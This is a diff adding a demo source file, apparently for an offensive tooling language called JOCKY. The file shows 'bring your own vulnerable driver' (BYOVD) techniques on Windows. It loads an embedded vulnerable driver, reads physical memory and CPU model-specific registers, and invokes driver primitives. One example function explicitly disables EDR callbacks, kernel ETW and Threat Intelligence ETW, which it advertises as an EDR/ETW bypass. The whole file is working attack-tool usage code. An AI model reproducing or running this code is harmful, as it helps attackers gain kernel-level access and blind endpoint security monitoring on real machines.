@@ -1,0 +1,228 @@
+// JOCKY Driver Configuration Demo
+//
+// This example demonstrates how to configure and use drivers with JOCKY.
+// Requires running on Windows with admin privileges.
+
+ffi printf(fmt: string, ...) -> i32;
+ffi jocky_byovd_new() -> i64;
+ffi jocky_byovd_load(service_name: i64, device_name: i64, ctx: i64) -> bool;
+ffi jocky_byovd_unload(ctx: i64) -> void;
+ffi jocky_byovd_destroy(ctx: i64) -> void;
+ffi jocky_manifest_load() -> bool;
+ffi jocky_driver_read_phys(ctx: i64, addr: i64, buf: i64, size: i32) -> bool;
+ffi jocky_driver_write_phys(ctx: i64, addr: i64, buf: i64, size: i32) -> bool;
+ffi jocky_driver_read_msr(ctx: i64, msr_id: i32, out: i64) -> bool;
+ffi jocky_driver_write_msr(ctx: i64, msr_id: i32, val: i64) -> bool;
+ffi jocky_driver_invoke(ctx: i64, primitive: string, in_buf: i64, in_size: i32, out_buf: i64, out_size: i32) -> bool;
+ffi jocky_disable_edr_callbacks(ctx: i64) -> bool;
+ffi jocky_disable_etw(ctx: i64) -> bool;
+ffi jocky_disable_etw_ti(ctx: i64) -> bool;
+ffi jocky_alloc(size: i64) -> i64;
+ffi jocky_free(ptr: i64) -> void;
+
+fn example_load_driver() -> void {
+    printf("=== Example 1: Load BYOVD Driver ===\n");
+
+    let ctx: i64 = jocky_byovd_new();
+    if ctx == 0 {
+        printf("Failed to allocate context\n");
+        return;
+    }
+
+    // Load the driver embedded in the .jdrv section
+    // service_name and device_name are NULL (auto-generated)
+    if !jocky_byovd_load(0, 0, ctx) {
+        printf("Failed to load BYOVD driver\n");
+        jocky_byovd_destroy(ctx);
+        return;
+    }
+
+    printf("Driver loaded successfully\n");
+
+    // Unload and cleanup
+    jocky_byovd_unload(ctx);
+    jocky_byovd_destroy(ctx);
+    printf("Driver unloaded\n");
+}
+
+fn example_read_physical_memory() -> void {
+    printf("\n=== Example 2: Read Physical Memory ===\n");
+
+    let ctx: i64 = jocky_byovd_new();
+    if !jocky_byovd_load(0, 0, ctx) {
+        printf("Failed to load driver\n");
+        jocky_byovd_destroy(ctx);
+        return;
+    }
+
+    // Allocate buffer for reading
+    let buf: i64 = jocky_alloc(256);
+    if buf == 0 {
+        printf("Failed to allocate buffer\n");
+        jocky_byovd_unload(ctx);
+        jocky_byovd_destroy(ctx);
+        return;
+    }
+
+    // Read 256 bytes from physical address 0x1000
+    let phys_addr: i64 = 4096;  // 0x1000
+    let size: i32 = 256;
+
+    printf("Reading %d bytes from physical address 0x%x\n", size, phys_addr);
+
+    if jocky_driver_read_phys(ctx, phys_addr, buf, size) {
+        printf("Read successful\n");
+    } else {
+        printf("Read failed\n");
+    }
+
+    // Cleanup
+    jocky_free(buf);
+    jocky_byovd_unload(ctx);
+    jocky_byovd_destroy(ctx);
+}
+
+fn example_msr_operations() -> void {
+    printf("\n=== Example 3: MSR Read (WinRing0 only) ===\n");
+
+    let ctx: i64 = jocky_byovd_new();
+    if !jocky_byovd_load(0, 0, ctx) {
+        printf("Failed to load driver\n");
+        jocky_byovd_destroy(ctx);
+        return;
+    }
+
+    // Allocate output buffer for MSR value
+    let msr_out: i64 = jocky_alloc(8);
+    if msr_out == 0 {
+        printf("Failed to allocate buffer\n");
+        jocky_byovd_unload(ctx);
+        jocky_byovd_destroy(ctx);
+        return;
+    }
+
+    // Read MSR 0xC0000080 (IA32_EFER)
+    let msr_id: i32 = 0xC0000080;
+
+    printf("Reading MSR 0x%x (IA32_EFER)...\n", msr_id);
+
+    if jocky_driver_read_msr(ctx, msr_id, msr_out) {
+        printf("MSR read successful\n");
+    } else {
+        printf("MSR read failed (driver may not support this)\n");
+    }
+
+    // Cleanup
+    jocky_free(msr_out);
+    jocky_byovd_unload(ctx);
+    jocky_byovd_destroy(ctx);
+}
+
+fn example_kernel_primitives() -> void {
+    printf("\n=== Example 4: Kernel Primitives (EDR/ETW Disable) ===\n");
+
+    let ctx: i64 = jocky_byovd_new();
+    if !jocky_byovd_load(0, 0, ctx) {
+        printf("Failed to load driver\n");
+        jocky_byovd_destroy(ctx);
+        return;
+    }
+
+    // Disable EDR callbacks
+    printf("Disabling EDR callbacks...\n");
+    if jocky_disable_edr_callbacks(ctx) {
+        printf("EDR callbacks disabled\n");
+    } else {
+        printf("Failed to disable EDR callbacks\n");
+    }
+
+    // Disable kernel ETW
+    printf("Disabling kernel ETW...\n");
+    if jocky_disable_etw(ctx) {
+        printf("Kernel ETW disabled\n");
+    } else {
+        printf("Failed to disable kernel ETW\n");
+    }
+
+    // Disable Threat Intelligence ETW
+    printf("Disabling Threat Intelligence ETW...\n");
+    if jocky_disable_etw_ti(ctx) {
+        printf("Threat Intelligence ETW disabled\n");
+    } else {
+        printf("Failed to disable Threat Intelligence ETW\n");
+    }
+
+    // Cleanup
+    jocky_byovd_unload(ctx);
+    jocky_byovd_destroy(ctx);
+}
+
+fn example_manifest_operations() -> void {
+    printf("\n=== Example 5: Manifest-Based Driver Invocation ===\n");
+
+    // Load manifest from .jmani section (auto-loaded normally)
+    if !jocky_manifest_load() {
+        printf("No manifest found (normal if not built with --manifest)\n");
+        return;
+    }
+
+    printf("Manifest loaded from .jmani section\n");
+
+    let ctx: i64 = jocky_byovd_new();
+    if !jocky_byovd_load(0, 0, ctx) {
+        printf("Failed to load driver\n");
+        jocky_byovd_destroy(ctx);
+        return;
+    }
+
+    // Allocate buffers
+    let in_buf: i64 = jocky_alloc(16);
+    let out_buf: i64 = jocky_alloc(256);
+
+    if in_buf == 0 || out_buf == 0 {
+        printf("Failed to allocate buffers\n");
+        jocky_free(in_buf);
+        jocky_free(out_buf);
+        jocky_byovd_unload(ctx);
+        jocky_byovd_destroy(ctx);
+        return;
+    }
+
+    // Invoke a custom driver primitive via manifest
+    printf("Invoking manifest primitive 'custom_read'...\n");
+
+    if jocky_driver_invoke(ctx, "custom_read", in_buf, 16, out_buf, 256) {
+        printf("Invocation successful\n");
+    } else {
+        printf("Invocation failed (primitive not found in manifest)\n");
+    }
+
+    // Cleanup
+    jocky_free(in_buf);
+    jocky_free(out_buf);
+    jocky_byovd_unload(ctx);
+    jocky_byovd_destroy(ctx);
+}
+
+fn main() -> i32 {
+    printf("╔════════════════════════════════════════════════════╗\n");
+    printf("║    JOCKY Driver Configuration Demo Script         ║\n");
+    printf("╚════════════════════════════════════════════════════╝\n\n");
+
+    printf("Demonstrating JOCKY driver configuration:\n");
+    printf("  - BYOVD driver loading\n");
+    printf("  - Physical memory read/write\n");
+    printf("  - MSR operations\n");
+    printf("  - Kernel primitives (EDR/ETW bypass)\n");
+    printf("  - Manifest-based driver invocation\n\n");
+
+    // Run examples
+    example_load_driver();
+    example_read_physical_memory();
+    example_msr_operations();
+    example_kernel_primitives();
+    example_manifest_operations();
+
+    printf("\n✓ Demo complete\n");
+    return 0;
+}
